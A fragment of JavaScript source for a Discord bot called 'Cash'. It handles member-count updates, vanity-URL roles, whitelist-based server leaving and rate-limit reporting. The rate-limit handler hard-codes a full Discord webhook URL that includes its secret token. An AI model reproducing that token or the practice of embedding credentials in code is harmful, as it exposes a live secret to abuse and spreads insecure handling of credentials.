client.on('guildMemberRemove', async (guildMember) => {
    const memberStatChan = guildMember.guild.channels.cache.find(channel => channel.type == ChannelType.GuildVoice && channel.name.includes('members:'));
    if (memberStatChan) {
        await memberStatChan.edit({ name: `members: ${guildMember.guild.members.cache.size}` }).catch((err) => console.log(err));
    }
})

client.on('presenceUpdate', async (oldPresence, newPresence) => {
    const memberState = newPresence.member.presence.activities.find(activity => activity.state);
    if (newPresence.guild.vanityURLCode !== null) {
        if (newPresence.guild.id == config.server) {
            const vanityRole = newPresence.guild.roles.cache.get('1222699321237962833') // my vanity role
            try {
                if (memberState == null) return newPresence.member.roles.remove(vanityRole.id)
                if (memberState.state.includes('/' + newPresence.guild.vanityURLCode)) {
                    newPresence.member.roles.add(vanityRole.id)
                } else {
                    newPresence.member.roles.remove(vanityRole.id)
                }
            } catch (err) {
                console.log('error handling presence event - ' + err);
            }
        }
    }
});

client.on('debug', console.log).on('warn', console.log);

client.on('guildCreate', async (guild) => {
    let whitelistedGuilds = [config.server, '1218968327146311880', '852286442000351253']

    if (!whitelistedGuilds.includes(guild.id)) {
        try {
            const channel = guild.channels.cache.find(channel => channel.type == ChannelType.GuildText && channel.permissionsFor(guild.members.me).has('SEND_MESSAGES'));
            if (!channel) return guild.leave();
            await channel.send(`Cash is a premium bot and cannot be added to servers for free. This server is not whitelsited to join. Join https://discord.gg/rare and purchase a server activation.\nI'll automatically leave this server shortly`);
            await guild.leave();
        } catch (err) {
            console.log(`error handling guild whitelist - ` + err);
        }
    }
});

client.once('ready', async () => {
    console.log(`${client.user.username} is online`);
    client.user.setActivity({ name: `hanafudaa.github.io/cash-bot/`, type: ActivityType.Watching });
});

client.on('error', async (error) => { console.log(error) });

client.rest.on('rateLimited', (ratelimit) => { // sends webhook message to rates channel with specific rate information
    const rateLimitWH = new WebhookClient({ url: 'https://discord.com/api/webhooks/1218664471959179336/8u-Vhrd-Yo07N4H2R1YmG_GIBwsNtg0eLWBq2ZY2Ak942jahKM33z1chXBO_P-CHHVni' });
    rateLimitWH.send({
        content: `\n### method: \`${ratelimit.method}\`\n### url: \`${ratelimit.url}\`\n### route: \`${ratelimit.route}\`\n### request limit: \`${ratelimit.limit}\`\n### global?: \`${ratelimit.global}\`\n### reset after: \`${ratelimit.timeToReset}\`\n### hash: \`${ratelimit.hash}\`\n### majorParameter: \`${ratelimit.majorParameter}\``
    }).catch((err) => console.error(err));
});

(async () => {
    await mongoose.connect(config.mongoDB_URI);
    console.log('Connected to the database.')

    client.login(config.token);
})();